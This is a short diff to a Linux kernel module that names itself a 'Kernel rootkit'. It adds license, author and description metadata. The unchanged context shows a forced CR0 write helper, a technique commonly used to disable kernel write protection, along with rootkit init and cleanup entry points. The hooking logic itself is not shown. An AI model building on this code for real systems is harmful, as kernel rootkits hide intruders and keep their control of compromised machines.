@@ -9,7 +9,6 @@
 #include <linux/version.h>
 #include <asm/paravirt.h>
 
-
 static inline void write_cr0_forced(unsigned long val)
 {
     asm volatile("mov %0,%%cr0": "+r" (val), "+m" (__force_order));
@@ -60,3 +59,7 @@ static void __exit cleanup_rootkit(void)
 
 module_init(init_rootkit);
 module_exit(cleanup_rootkit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Pedro Peck");
+MODULE_DESCRIPTION("Kernel rootkit");
